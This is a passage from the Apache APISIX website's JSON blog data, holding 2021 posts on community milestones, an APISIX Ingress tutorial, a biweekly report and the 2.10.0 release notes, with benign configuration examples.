worldwide!","metadata":{"permalink":"/blog/2021/10/13/celebrating-300-contributors-of-apisix","source":"@site/blog/2021/10/13/celebrating-300-contributors-of-apisix.md","title":"New milestone for APISIX - over 300 contributors worldwide!","description":"The API Gateway Apache APISIX community has reached a new milestone, surpassing 300 contributors worldwide to projects related to Apache APISIX!","date":"2021-10-13T00:00:00.000Z","formattedDate":"October 13, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.34,"truncated":true,"authors":[{"name":"Apache APISIX"}],"prevItem":{"title":"Bieekly Report (Oct 1 - Oct 14)","permalink":"/blog/2021/10/14/weekly-report-1014"},"nextItem":{"title":"Get started with Apache APISIX Ingress from concept to practice","permalink":"/blog/2021/10/09/apisix-ingress-techblog"}},"content":"> The Apache APISIX community has reached a new milestone of 300 contributors worldwide to projects related to Apache APISIX! Only 3 months have passed since the Apache APISIX main repository reached the [200 contributor milestone](https://apisix.apache.org/blog/2021/07/06/celebrate-200-contributors/)! Thank you to the community contributors for their outstanding contributions in all aspects of code, documentation, operations, and more.\\n\\n\x3c!--truncate--\x3e\\n\\n![Apache APISIX contributor graph](https://static.apiseven.com/202108/1634110612788-576eb5ea-d574-4d8e-891c-8f9fc90d955a.png)\\n\\nPS: Recommend reading \\"[Contributors, the golden metric of open source projects](https://apisix.apache.org/zh/blog/2021/08/14/contributors-the-golden-metric-of-openSource-projects-en), [Contributor trends graph](https://github.com/api7/contributor-graph)\\n\\nIn January 2020 Apache APISIX released version 1.0, the first production version of Apache APISIX. Late last month Apache APISIX released the latest version [2.10.0](https://apisix.apache.org/zh/blog/2021/09/29/release-apache-apisix-2.10/), which is the 24th release of Apache APISIX. The Apache APISIX community maintains a fast and steady pace, with **a new release every month**. Every discussion, every PR, and every milestone of Apache APISIX is dependent on the participation of its contributors.\\n\\nThere is no barrier to becoming an Apache APISIX contributor, and the Apache APISIX community includes not only contributions of code, but also documentation, testing, design, making videos, and more. Raising PRs or issues on Github, participating in discussions on mailing lists, sharing via live streams, helping people solve problems in networking groups, and attending Meetups are all ways to get involved in the community. Welcome to the Apache APISIX community!\\n\\n![Apache APISIX contributors](https://static.apiseven.com/202108/1634110807125-883173f0-ddb2-4ad0-aafe-073a669bb7a0.jpg)\\n\\n## Community Events\\n\\nThe Apache APISIX community is very active, and contributors organize monthly events to help people better understand and apply Apache APISIX.\\n\\n### Apache APISIX Meetup\\n\\n2021 Apache APISIX hosts several offline and online Meetups with Apache APISIX PMC members, Committers, Contributors, and enterprise technologists to share best practices for Apache APISIX.\\nFollow [Apache APISIX bilibili](https://space.bilibili.com/551921247) for past recaps.\\n\\n### Apache APISIX Ingress Online Discussion\\n\\nThe Apache APISIX Ingress project hosts bi-weekly online discussions to discuss PRs, issues, share best practices, insights and design ideas for Ingress, see [issues](https://github.com/apache/apisix-ingress-controller/issues/614) for the online meeting address, and [bilibili video link](https://space.bilibili.com/551921247) for a recap of past issues.\\n\\n### Weekly Report\\n\\nThis is a bi-weekly summary of Apache APISIX project features, bug fixes, community events, case studies, and more, to help you get up to speed on the latest developments in Apache APISIX.\\nYou can view the bi-weekly Weekly report by clicking Blog and selecting Events tag on the Apache APISIX official website.\\n\\nPast recommendations.\\n\\n- [Community Weekly Report\uff5cTwo new committers, feature highlights update in progress](https://apisix.apache.org/zh/blog/2021/09/15/weekly-report)\\n- [Apache APISIX Community Weekly Report \uff5c 2021 8.23-8.29](https://apisix.apache.org/zh/blog/2021/08/30/weekly-report)\\n- [Apache APISIX Community Weekly Report \uff5c 2021 8.16-8.22](https://apisix.apache.org/zh/blog/2021/08/23/weekly-report)\\n\\nWhat kind of events do you want the Apache APISIX community to organize? Or want to be an organizer/volunteer for an event, feel free to discuss it on the [mailing list](https://apisix.apache.org/zh/docs/general/join)!\\n\\nApache APISIX community is thankful to have you, and we are looking forward to more people joining the Apache APISIX community. The Apache APISIX community is grateful to have you."},{"id":"Get started with Apache APISIX Ingress from concept to practice","metadata":{"permalink":"/blog/2021/10/09/apisix-ingress-techblog","source":"@site/blog/2021/10/09/apisix-ingress-techblog.md","title":"Get started with Apache APISIX Ingress from concept to practice","description":"This article introduces the definition of API gateway Apache APISIX Ingress and its differences and advantages with K8s Ingress NGINX.","date":"2021-10-09T00:00:00.000Z","formattedDate":"October 9, 2021","tags":[{"label":"Ecosystem","permalink":"/blog/tags/ecosystem"},{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":9.33,"truncated":true,"authors":[{"name":"Jintao Zhang","url":"https://github.com/tao12345666333","imageURL":"https://avatars.githubusercontent.com/u/3264292?v=4"}],"prevItem":{"title":"New milestone for APISIX - over 300 contributors worldwide!","permalink":"/blog/2021/10/13/celebrating-300-contributors-of-apisix"},"nextItem":{"title":"Apache APISIX community members help openEuler release first innovation version","permalink":"/blog/2021/10/01/openeuler"}},"content":"> Jintao Zhang, Apache APISIX Committer, Kubernetes Ingress Nginx Reviewer, and contributor to several cloud-native open source projects.\\n\\n\x3c!--truncate--\x3e\\n\\n## Apache APISIX Ingress Overview\\n\\n### Apache APISIX Ingress Definition\\n\\nIn the K8s ecosystem, Ingress is a resource that represents the entry point for K8s traffic. To make it effective, an Ingress Controller is needed to listen to the Ingress resources in K8s and resolve the rules and actually carry the traffic for those resources. The most widely used Ingress Controller implementations in today\'s trends are Kubernetes Ingress Nginx.\\n\\nAPISIX Ingress is another implementation of the Ingress Controller. The main difference with Kubernetes Ingress Nginx is that APISIX Ingress uses Apache APISIX as the actual data plane that carries business traffic. As shown in the figure below, when a user requests a specific service/API/web page, the entire business traffic/user request is transferred to the K8s cluster through an external proxy and then processed by APISIX Ingress.\\n\\n![APISIX Ingress Architecture](https://static.apiseven.com/202108/1633765366863-8964a75c-0c16-4683-ad9b-c8c83ac64ec6.png)\\n\\nAs you can see from the above diagram, APISIX Ingress is divided into two parts. One part is the APISIX Ingress Controller, which is the control plane that will do the configuration management and distribution. The other part is the APISIX Proxy Pod, which is responsible for carrying business traffic and is implemented by means of CRD (Custom Resource Definitions).\\n\\n### Apache APISIX in a nutshell\\n\\nWe mentioned earlier that APISIX Ingress uses Apache APISIX as the data surface that actually carries business traffic, so what does the Apache APISIX project do?\\n\\n![Apache APISIX Architecture](https://static.apiseven.com/202108/1633765402660-6b20dd1c-bef6-4dcb-974e-fa80334e0623.png)\\n\\nApache APISIX is the top open source project of the Apache Foundation and is currently the most active open source gateway project. As a dynamic, real-time, high-performance open source API gateway, Apache APISIX provides rich traffic management features such as load balancing, dynamic upstream, canary release, service meltdown, authentication, observability, and more.\\n\\nApache APISIX helps enterprises handle API and microservice traffic quickly and securely with features such as flow-limiting authentication, logging security features, and support for rich custom plug-ins. There are also currently relevant integrations with many open source projects such as Apache SkyWalking, Prometheus and other such components.\\n\\n## APISIX Ingress vs K8s Ingress Nginx\\n\\nSince I am involved in the development and maintenance of both APISIX Ingress and K8s Ingress Nginx, many people ask me how to choose between these two projects. Or why do you want to do APISIX Ingress when you have K8s Ingress Nginx.\\n\\n### Configuration level\\n\\nIn APISIX Ingress, we have added some rich and flexible configurations, such as canary release deployment through a single configuration file. However, in K8s Ingress Nginx, you need at least two Ingress resource files to achieve the above effect.\\n\\n### Richness\\n\\nIn terms of richness, because Apache APISIX is feature-rich and allows for multiple plugins, using APISIX Ingress eliminates the need to configure additional features yourself, allowing you to spend more time on actual development.\\n\\n### Architecture separation\\n\\nAPISIX Ingress uses a separate architecture for the data plane and control plane, so users can choose to deploy the data plane inside/outside the K8s cluster. However, K8s Ingress Nginx puts the control plane and the data plane in the same Pod, so if something happens to the Pod or the control plane, the whole Pod will hang, which will affect business traffic.\\n\\nThis architectural separation gives users a more convenient deployment option and facilitates data migration and usage in business architecture adjustment scenarios.\\n\\n## APISIX Ingress Features Explained\\n\\nSince Apache APISIX is a fully dynamic, high-performance gateway, APISIX Ingress itself supports full dynamics, including routing, SSL certificates, upstream, plug-ins, and more.\\n\\nAPISIX Ingress also has the following features.\\n\\n* CRD support for easier understanding of declarative configurations; while state checking ensures quick access to the synchronized state of declarative configurations\\n* Support for advanced route matching rules and custom resources, which can be extended with more than 50 official Apache APISIX plug-ins & customer-defined plug-ins\\n* Support for K8s native Ingress configuration\\n* Support for traffic slicing\\n* Support for gRPC plaintext and TCP Layer 4 proxy\\n* Automatic service registration and discovery, no fear of scaling up or down\\n* More flexible load balancing policy with health check function\\n\\nThe following is a detailed introduction to CRD and custom resources.\\n\\n### CRD Extensions\\n\\nWe mentioned CRD in the previous introduction, but how does APISIX Ingress use CRD extensions?\\n\\n![CRD Extensions](https://static.apiseven.com/202108/1633765449155-0e25f1d0-e62a-4c4f-ab9a-019f609ed5fb.png)\\n\\nAt the user level, when a request is made by a Client and arrives at Apache APISIX, the corresponding service traffic is directly transferred to the backend (e.g., Service Pod), thus completing the forwarding process. This process does not need to go through the Ingress Controller, which can ensure that if there are problems, or changes, expansion and contraction or migration processing, it will not affect the users and business traffic.\\n\\nOn the configuration side, users can apply custom CRD configurations to K8s clusters via kubectl apply, and Ingress Controller will continuously watch these resource changes to apply the corresponding configurations to Apache APISIX.\\n\\n### Custom resources\\n\\nAPISIX Ingress currently supports the following 5 categories of custom resources related to routing, upstream, consumer, certificate related and cluster public configuration.\\n\\n#### APISIX Route\\n\\nThe top-level configuration for the `spec` attribute in the custom resource APISIX Route is `http`. But actually `spec` supports both configurations, `spec.http` as in the example below, which is mainly used for Layer 7 proxies, and `spec.stream`, which is used for Layer 4 proxies. In the configuration file, we first customize a rule for it, namely the relevant parameter under match.\\n\\n![APISIX Route](https://static.apiseven.com/202108/1633765501091-e64ff6e5-5e3e-4b0f-adcc-7ff418edb52c.png)\\n\\nAs the above back-end configuration example uses the same Service, you can adjust it according to the scenario in actual use. Note that the `weight` attribute is used to configure the relevant service weight. With the above configuration, a complete set of routing customization resources can be implemented.\\n\\n#### APISIX Upstream (Upstream)\\n\\nWhen configuring APISIX Upstream, you need to pay attention to the content of `name` to be consistent with the Service of K8s cluster, so as to ensure that the subsequent APISIX Ingress Controller can accurately match its corresponding traffic.\\n\\n![APISIX Upstream](https://static.apiseven.com/202108/1633765534667-3ce978ae-2d85-4de7-8a57-3c5be5f57604.png)\\n\\nIn the configuration file, `spec.loadbalancer` is mainly responsible for setting the load balancing policy, and there are various policy modes to choose from. `spec.schem`e is for the protocol type configuration, currently only HTTP and gRPC protocols are supported. `spec.healthCheck` is mainly for setting the health check function, such as setting its active status, effective protocol and path and final feedback and other parameters configuration.\\n\\n#### APISIX Consumer\\n\\nThe APISIX Consumer configuration mainly adds authentication-related features, such as `spec.authParameter`, which currently supports `BasicAuth` and `KeyAuth`, the two more common types of authentication.\\n\\n![APISIX Consumer](https://static.apiseven.com/202108/1633765580844-9d17d699-fa45-4b43-9ed9-f8ea9c9cab48.png)\\n\\nYou can configure the associated `username` and `password` directly with `value`, or directly with `secret`, which is more secure than the plaintext configuration of the former.\\n\\n#### APISIX TLS (certificate)\\n\\nAPISIX TLS is mainly for certificate management. As the example shows, users can configure multiple domains via `hosts`, and the parameters under `secret` are the corresponding configuration certificates.\\n\\n![APISIX TLS](https://static.apiseven.com/202108/1633765614989-88b363c2-3805-4159-abfc-bac1b055559b.png)\\n\\nApache APISIX TLS also comes with `spec.client` for configuring mTLS two-way authentication.\\n\\n#### APISIX Config\\n\\nThe Config types supported by custom resources are described in two ways.\\n\\n![APISIX Cluster Config](https://static.apiseven.com/202108/1633765647605-6ad1ba44-06fd-475d-a6ae-925b3cc9c1ce.png)\\n\\nOne type is APISIX Cluster Config, which is mainly used for some generic configurations. Currently it supports global use of Prometheus plug-in/global configuration SkyWalking in K8s or Apache APISIX, and we will add some other generic configurations in subsequent development.\\n\\nAnother one is the [APISIX Plugin Config](https://github.com/apache/apisix-ingress-controller/pull/689) that we are currently working on in PR. If you are interested, you can also click the link to join the discussion. Plugin Config is mainly a unified collection of common plug-in configurations, for example, some of the same configuration, users can use APISIX Plugin Config to apply to multiple routes at the same time, eliminating the tedious steps of multiple independent configurations.\\n\\n## APISIX Ingress Hands-On Practice\\n\\nCurrently, you can deploy APISIX Ingress via [Helm Charts](https://github.com/apache/apisix-helm-chart). You can deploy both Apache APISIX and APISIX Ingress, including the etcd required for Apache APISIX, with a single command, which is very simple.\\n\\n![Installation Steps](https://static.apiseven.com/202108/1633765686788-156b0641-aa78-4de8-833d-a187772470a5.png)\\n\\n### Practice Scenario 1: Traffic Segmentation\\n\\nBy using APISIX Ingress, you can achieve the effect of proportional traffic slicing, as follows.\\n\\n#### Step 1: Configure APISIX Upstream\\n\\n![Configure APISIX Upstream](https://static.apiseven.com/uploads/2023/05/09/BpWGcRfs_au.png)\\n\\n#### Step 2: Configure APISIX Route\\n\\nConfigure `subset` and `weight` in `backends` to split the incoming user request traffic. The example below shows that 90% of the traffic will go to v1 and 10% of the traffic will go to v2.\\n\\n![Configure APISIX Route](https://static.apiseven.com/uploads/2023/05/09/PoSvDlQJ_ar.png)\\n\\nWith the above two steps, it is very easy to slice and dice traffic proportionally to achieve scenarios like canary release.\\nFor more details, please refer to: [Traffic Segmentation in Apache APISIX Ingress Controller](https://www.apiseven.com/zh/blog/traffic-split-in-apache-apisix-ingress-controller).\\n\\n### Practice Scenario 2: Configuring Authentication\\n\\nIf you want to configure Basic Auth for certain routes in APISIX Ingress, you can refer to the following actions.\\n\\n#### Step 1: Create APISIX Consumer resource\\n\\nAs mentioned earlier, you can add `basicAuth` to the APISIX Consumer configuration and specify a username and password for it.\\n\\n![Create Resource](https://static.apiseven.com/202108/1633765803898-7a30c663-7ba8-4064-8772-a19c56cef191.png)\\n\\n#### Step 2: Configure the APISIX Route and add authentication-related parameters\\n\\nIn the custom resource APISIX Route, simply turn it on and specify the authentication type by adding `authenticatio`n to the backend.\\n\\n![Add authentication parameters](https://static.apiseven.com/202108/1633765828596-9a0f0142-f201-4004-b85d-a34de4ee13dc.png)\\n\\nWith the above steps, it is possible to use Consumer to complete the relevant configuration authentication.\\n\\n### Practice Scenario 3: K8s Resource Extensions\\n\\nAs we mentioned at the beginning, APISIX Ingress supports not only custom resources, but also K8s native Ingress resources.\\n\\n![K8s native resources](https://static.apiseven.com/202108/1633765859904-bc48dcc5-cd7a-4875-b248-5c4c64a2d7c5.png)\\n\\nThe image above shows the K8s Ingress resource. Normally if you want to do rewrite on a resource, you can add annotation configuration attributes. This way when the user carries the `httpbin.org` request, it can be redirected to /ip via the path /sample.\\n\\nWhen the above requirement uses APISIX Ingress, simply add a `kubernetes.io/ingress.class: apisix` to Ingress to specify the APISIX Ingress Controller to listen to this resource, and configure `k8s.apisix.apache.org/rewrite-target: \\"/ip\\"` to complete the redirection to the /ip path.\\n\\n![APISIX Ingress Resources](https://static.apiseven.com/202108/1633765888876-d2d252ee-706c-49f3-b630-03a7e72a0620.png)\\n\\nThe above example is just one of the ways APISIX Ingress currently supports native K8s Ingress, for more examples you can check the [specific documentation](https://apisix.apache.org/docs/ingress-controller/practices/proxy-the-httpbin-service-with-ingress) for reference and use.\\n\\n## Future Plans\\n\\nAPISIX Ingress will continue to be updated in terms of functionality and ecology, and the current phase has been completed [APISIX Ingress and Cert-manager integration](https://github.com/apache/apisix-ingress-controller/blob/master/docs/en/latest/practices/manage-certificates-with-cert-manager.md), and the following goals will be achieved step by step.\\n\\n1. complete Kubernetes V1.22+ and CRD V1 version adaptation support (completed, soon to be released in APISIX Ingress V1.3 version)\\n2. support for Gateway API (expected in Q4)\\n3. extend the new architecture to allow users to use APISIX Ingress without the need to use etcd\\n4. enrich the product ecology and expand the APISIX Ingress community\\n\\nFinally, we hope you can participate in the project more often, for example, there will be an APISIX Ingress community meeting every two weeks on Wednesday at 2 pm, and we will synchronize the current progress of the project or the problems we encountered. Keep an eye on the Apache APISIX video to participate in the live community meetings.\\n\\n[Click here](https://github.com/apache/apisix-ingress-controller/issues/614) for more details about the APISIX Ingress community meetings."},{"id":"2021/10/01/openeuler","metadata":{"permalink":"/blog/2021/10/01/openeuler","source":"@site/blog/2021/10/01/openEuler.md","title":"Apache APISIX community members help openEuler release first innovation version","description":"Apache APISIX community members put a lot of effort into the OpenResty migration in the first community innovation release of openEuler.","date":"2021-10-01T00:00:00.000Z","formattedDate":"October 1, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2,"truncated":true,"authors":[],"prevItem":{"title":"Get started with Apache APISIX Ingress from concept to practice","permalink":"/blog/2021/10/09/apisix-ingress-techblog"},"nextItem":{"title":"Biweekly Report (Sep 13 - Sep 30)","permalink":"/blog/2021/09/30/weekly-report"}},"content":"> [Zexuan Luo](https://github.com/spacewander) and [Ming Wen](https://github.com/moonming) from the Apache APISIX community have done a lot of work in the first community innovation release of openEuler on September 30 ([openEuler 21.09](https://openeuler.org/)), contributed a lot to the [OpenResty](https://github.com/openresty/openresty) migration effort, allowing OpenResty to run smoothly and efficiently on the Euler open source OS. The stable operation of OpenResty also means that [Apache APISIX](https://github.com/apache/apisix) can run smoothly on the openEuler system, and the underlying Apache APISIX is based on OpenResty for some development.\\n\x3c!--truncate--\x3e\\n\\nLet\'s get to know these two community members!\\n\\n[Zexuan Luo](https://github.com/spacewander), Apache APISIX PMC, core developer of OpenResty, Maintainer of git-extras project, good at C, Golang and Lua, has written many technical articles, recommend reading [Why Why did Apache APISIX choose Nginx + Lua as the technology stack?](https://apisix.apache.org/blog/2021/08/25/Why-Apache-APISIX-chose-Nginx-and-Lua), \\"[What\'s the difference: does etcd 3 support HTTP access perfectly?](https://apisix.apache.org/blog/2021/06/30/etcd3-support-HTTP-access-perfectly)\\".\\n\\n<img src=\\"https://static.apiseven.com/202108/1633068755509-66b85782-ecca-43cc-bbcc-5a7b11cee0f4.png\\" alt=\\"\u7f57\u6cfd\u8f69\\" style={{width: \\"200px\\"}} />\\n\\n[Ming Wen](https://github.com/moonming), Apache Member, Apache APISIX PMC Chair, core developer of OpenResty, former member of 360 Open Source Technical Committee, he has more than ten years development experience. He is the author of the Geek Time column \\"[OpenResty from Introduction to Practice](https://time.geekbang.org/column/intro/186)\\".\\n\\n<img src=\\"https://static.apiseven.com/202108/1633068755501-b52403ee-c43a-4da7-9ca7-46bc457da6fa.png\\" alt=\\"\u6e29\u94ed\\" style={{width: \\"300px\\"}} />\\n\\nApache APISIX has been growing as a community since the first day of open source. Apache APISIX partners are not only active in this community, but also actively participate in open source projects in other communities, which is the embodiment of the open source spirit, open source is not only open source code, but also open community, open mind, cooperation and mutual assistance between communities, and we contribute together to better open source products.\\n\\nIn addition to the two community members, I would like to introduce Apache APISIX. openEuler\'s first community innovation version (21.09) greatly enriches the cloud-native related infrastructure, [Apache APISIX](https://github.com/apache/apisix) naturally has the advantages of cloud-native, supporting Bare metal, virtual machine, Kubernetes, ARM64, public cloud, hybrid cloud and many other deployment modes. We expect Apache APISIX to be applied to more businesses and more scenarios on openEuler.\\n\\n![Apache APISIX Eco](https://static.apiseven.com/202108/1633068859274-4db4d50e-2646-433b-94cf-b75727bf877e.png)\\n\\n## About OpenEuler\\n\\n[openEuler](https://openeuler.org/) is an open source, free Linux distribution platform that works with developers worldwide to build an open, diverse and architecturally inclusive software ecosystem through a community format. openEuler 21.09 is the first community innovation release of an open source operating system for digital infrastructure that It extends scenario-based applications such as cloud computing, edge computing, and embedded."},{"id":"Biweekly Report (Sep 13 - Sep 30)","metadata":{"permalink":"/blog/2021/09/30/weekly-report","source":"@site/blog/2021/09/30/weekly-report.md","title":"Biweekly Report (Sep 13 - Sep 30)","description":"The cloud native API gateway Apache APISIX has added functions related to stream_route, debug mode, and hmac-auth plugin in the past two weeks.","date":"2021-09-30T00:00:00.000Z","formattedDate":"September 30, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.44,"truncated":true,"authors":[],"prevItem":{"title":"Apache APISIX community members help openEuler release first innovation version","permalink":"/blog/2021/10/01/openeuler"},"nextItem":{"title":"Release Apache APISIX 2.10.0","permalink":"/blog/2021/09/29/release-apache-apisix-2.10"}},"content":"> From 9.13 to 9.30, 32 developers have committed 93 commits to Apache APISIX. Thank you to these folks for making the Apache APISIX project better with your selfless efforts!\\n\\n\x3c!--truncate--\x3e\\n\\n## Introduction\\n\\nApache APISIX has grown as a community since the first day of open source and has quickly become the most active open source API gateway project in the world. These achievements could not have been achieved without the joint efforts of our community partners.\\n\\n\\"The Apache APISIX Community Weekly Newsletter hopes to help community members better grasp the weekly progress of the Apache APISIX community and facilitate your participation in the Apache APISIX community.\\n\\nWe\'ve also put together some issues for those new to the community!\\n\\n## Contributor statistics\\n\\n![This week\'s contributor list](https://static.apiseven.com/202108/1632907894918-c455f40e-a175-4944-8fac-11c590d43786.jpg)\\n\\n![New contributors this week](https://static.apiseven.com/202108/1632908362102-b0b665e2-f37f-4a82-b8a3-68914925b565.jpg)\\n\\n## Good first issue\\n\\n### Issue #5080\\n\\n**Link**: https://github.com/apache/apisix/issues/5080\\n\\n**Problem Description**: Previously the upstream service used IP authentication and the actual client IP was obtained from the x-forwarded-for request header. Now I need to change to gateway HMAC authentication, so I need to block upstream IP authentication through the gateway. Tried to modify x-forwarded-for via the proxy rewrite plugin, but it did not work: !\\n\\n![Screenshot of problem description](https://static.apiseven.com/202108/1632799650125-14edb988-f2ad-434d-8d13-04ff3016eb5a.png)\\n\\n### Issue #5108\\n\\n**Link**: https://github.com/apache/apisix/issues/5108\\n\\n**problem description**: as follows, when enabling the request validation plugin on a route:\\" delete \\"\\n\\n```shell\\ncurl http://127.0.0.1:9080/apisix/admin/routes/35 -H \'X-API-KEY: xxxxxxxxxxxxxxxxxxx\' -X PUT -d \'\\n{\\n    \\"uri\\":\\"/products/create\\",\\n    \\"plugins\\":{\\n        \\"request-validation\\":{\\n            \\"body_schema\\":{\\n                \\"type\\": \\"object\\",\\n                \\"required\\":[\\n                    \\"productName\\",\\n                    \\"price\\"\\n                ],\\n                \\"properties\\":{\\n                    \\"productName\\":{\\n                        \\"type\\": \\"string\\"\\n                    },\\n                    \\"price\\":{\\n                        \\"type\\": \\"number\\"\\n                    }\\n                }\\n            }\\n        }\\n    },\\n    \\"upstream\\":{\\n        \\"service_name\\": \\"PRODUCTSSERVICE\\",\\n        \\"type\\": \\"roundrobin\\",\\n        \\"discovery_type\\": \\"eureka\\"\\n    }\\n}\'\\n```\\n\\nTest it with the following command:\\n\\n```shell\\n$ curl http://127.0.0.1:9080/products/create -X POST -d \'{\\"product-Name\\":\\"Laptop\\",\\"pri-ce\\":12345.00}\'\\n```\\n\\nGet the following default message.\\n\\n```shell\\nproperty \\"price\\" is required\\n```\\n\\n## Feature highlights of the week\\n\\n- [debug-mode support for dynamic request filtering](https://github.com/apache/apisix/pull/5012) (contributor: [tzssangglass](https://github.com/tzssangglass))\\n\\n- [support for injecting logic into APISIX methods](https://github.com/apache/apisix/pull/5068) (contributor: [spacewander](https://github.com/spacewander))\\n\\n- [stream_route support for using CIDR in IP matching](https://github.com/apache/apisix/pull/4980) (Contributed by [Zheaoli](https://github.com/Zheaoli))\\n\\n- [hmac-auth support for checksum request bodies](https://github.com/apache/apisix/pull/5038) (Contributed by [arthur-zhang](https://github.com/arthur-zhang))\\n\\n- [APISIX Ingress controller integrates with cert-manager, so users can manage TLS certificates more easily and use it with APISIX Ingress](https://github.com/apache/apisix-ingress-controller/pull/685) (Contributed by [lingsamuel](https://github.com/lingsamuel))\\n\\n- [- APISIX Dashboard supports multiple profiles](https://github.com/apache/apisix-dashboard/pull/1946) (contributor: [bzp2010](https://github.com/bzp2010))\\n\\n## Recommended blog posts for this week\\n\\n- [Apache APISIX Implementation Practice in Tencent Cloud Smart Titanium Platform](http://apisix.apache.org/blog/2021/09/16/tencent-cloud).\\n\\n  This article introduces the enterprise case of using Apache APISIX in Tencent Cloud Intelligent Titanium Platform, and the specific example of using Apache APISIX as a product traffic gateway.\\n\\n- [Using Apache APISIX for Centralized Authentication and Advanced Play](http://apisix.apache.org/blog/2021/09/07/how-to-use-apisix-auth)\\n\\n  This article introduces the authentication function of Apache APISIX, in terms of importance and playful usage, with detailed introduction and detailed usage.\\n\\n- [Apache APISIX-based, iQiyi API gateway update and landing practice](http://apisix.apache.org/blog/2021/09/07/iQIYI-usercase)\\n\\n  By reading this article, you can learn how based on Apache APISIX gateway, the iQiYi technical team has updated and integrated the company\'s architecture to create a new gateway service."},{"id":"Release Apache APISIX 2.10.0","metadata":{"permalink":"/blog/2021/09/29/release-apache-apisix-2.10","source":"@site/blog/2021/09/29/release-apache-apisix-2.10.md","title":"Release Apache APISIX 2.10.0","description":"API Gateway Apache APISIX 2.10.0 is officially released! This is the first LTS release of Apache APISIX and supports more than 10 features and plugins at the same time.","date":"2021-09-29T00:00:00.000Z","formattedDate":"September 29, 2021","tags":[{"label":"Community","permalink":"/blog/tags/community"}],"readingTime":2.685,"truncated":true,"authors":[{"name":"Zexuan Luo","url":"https://github.com/spacewander","imageURL":"https://avatars.githubusercontent.com/u/4161644?v=4"}],"prevItem":{"title":"Biweekly Report (Sep 13 - Sep 30)","permalink":"/blog/2021/09/30/weekly-report"},"nextItem":{"title":"WPS with Apache APISIX to create new API gateway experience","permalink":"/blog/2021/09/28/wps-usercase"}},"content":"> Apache APISIX 2.10.0 is released!\\n\\n\x3c!--truncate--\x3e\\n\\nApache APISIX 2.10.0 is officially released! \ud83c\udf89 This is the first LTS release of Apache APISIX with support for 10+ new features and new plugins. Have a quick read to learn about the new features in version 2.10.0!\\n\\n## Milestone: The First LTS Release\\n\\nThis 2.10.0 release is a milestone for Apache APISIX, as Apache APISIX 2.10.0 is our first LTS (Long Time Support) release.\\n\\nWe will be releasing subsequent patch versions on top of Apache APISIX 2.10.0, i.e. 2.10.1, 2.10.2, etc. These releases will backport bugfixes from the main branch.\\n\\nIn October, we plan to release the first patch for the first LTS version, Apache APISIX 2.10.1.\\n\\nWe will then release alternating version lines 2.10.x (e.g. 2.10.2) and 2.x (e.g. 2.11.0) to keep the features iterative while ensuring that the LTS version gets the newer bugfixes.\\n\\n## New Feature: Add Hosts Attribute to Service\\n\\nIn Apache APISIX 2.10.0, we added the `hosts` property to `service`. Like the other fields in `service`, `route` can inherit the `hosts` attribute from `service`.\\n\\nFor example, the following configurations are equivalent in Apache APISIX 2.10.0:\\n\\n```json\\n# services/1\\n{\\n    \\"hosts\\": [\\"bar.com\\"]\\n}\\n# routes/1\\n{\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"service_id\\": \\"1\\",\\n    \\"uri\\": \\"/hello\\"\\n}\\n```\\n\\n```json\\n# routes/1\\n{\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"hosts\\": [\\"bar.com\\"],\\n    \\"uri\\": \\"/hello\\"\\n}\\n```\\n\\nWith this change, the relationship between `route` and `service` in Apache APISIX is becoming more and more similar to the relationship between `location` and `server` in Nginx. This change brings `service` back into the core Apache APISIX configuration: [Route](http://apisix.apache.org/docs/apisix/terminology/route), [Upstream](http://apisix.apache.org/docs/apisix/terminology/upstream), and [Service](http://apisix.apache.org/docs/apisix/terminology/service).\\n\\n## New Feature: Support Setting the Ratio of Mirror Requests\\n\\nThe proxy-mirror plugin\'s support for setting the ratio of mirrored requests is a feature users have been waiting for, and we support it on Apache APISIX 2.10.\\n\\nBy setting `sample_ratio`, you can control the number of requests that are mirrored to the test service. For example, the following configuration with `sample_ratio` set to 0.5 will mirror half of the requests to the test service.\\n\\n```json\\n{\\n    \\"plugins\\": {\\n        \\"proxy-mirror\\": {\\n            \\"host\\": \\"http://127.0.0.1:1986\\",\\n            \\"sample_ratio\\": 0.5\\n        }\\n    },\\n    \\"upstream\\": {\\n        \\"nodes\\": {\\n            \\"127.0.0.1:1980\\": 1\\n        },\\n        \\"type\\": \\"roundrobin\\"\\n    },\\n    \\"uri\\": \\"/hello\\"\\n}\\n```\\n\\n## New Plugin: APISIX Python Plugin Runner\\n\\nFollowing [Java Plugin Runner](https://apisix.apache.org/blog/2021/06/21/use-Java-to-write-Apache-APISIX-plugins/) and [Go Plugin Runner](https://apisix.apache.org/blog/2021/08/19/go-makes-Apache-APISIX-better/), there is a new Plugin Runner for Apache APISIX.\\n\\nThe [Apache APISIX Python Plugin Runner](https://github.com/apache/apisix-python-plugin-runner) has been released in version 0.1.0 on September 6.\\n\\nPython is a popular programming language that has always been known for its ease of use and flexibility. Now you and I can use the language to write plugins for Apache APISIX.\\n\\nIn addition to the Python Plugin Runner, our community partners are also developing Plugin Runners for other programming languages, such as the [JavaScript Plugin Runner](https://github.com/zenozeng/apisix-javascript-plugin-runner), and everyone is welcome to participate in the development.\\n\\n## Download\\n\\nIn addition to the above new features and components, the Apache APISIX 2.10.0 release introduces more than a dozen new features and plugins, for details please see the [Change log](https://github.com/apache/apisix/blob/release/2.10/) corresponding to this release CHANGELOG.md#2100).\\n\\nDownload Apache APISIX 2.10.0\\n\\n- Source code: Please visit [Download page](https://apisix.apache.org/downloads/)\\n- Binary installation package: Please visit [Installation Guide](https://apisix.apache.org/docs/apisix/how-to-build/)"},{"id":"2021/09/28/wps-usercase","metadata":{"permalink":"/blog/2021/09/28/wps-usercase","source":"@site/blog/2021/09/28/WPS-usercase.md","title":"WPS with Apache APISIX to create new API gateway experience","description":"In this article, Zhang Qiang, head of SRE network in WPS, explains how WPS can use Apache APISIX to handle Mega QPS, and update and improve gateway practices based on Apache APISIX.","date":"2021-09-28T00:00:00.000Z","formattedDate":"September 28, 2021","tags":[{"label":"Case Studies","permalink":"/blog/tags/case-studies"}],"readingTime":7.6,"truncated":true,"authors":[{"name":"Qiang 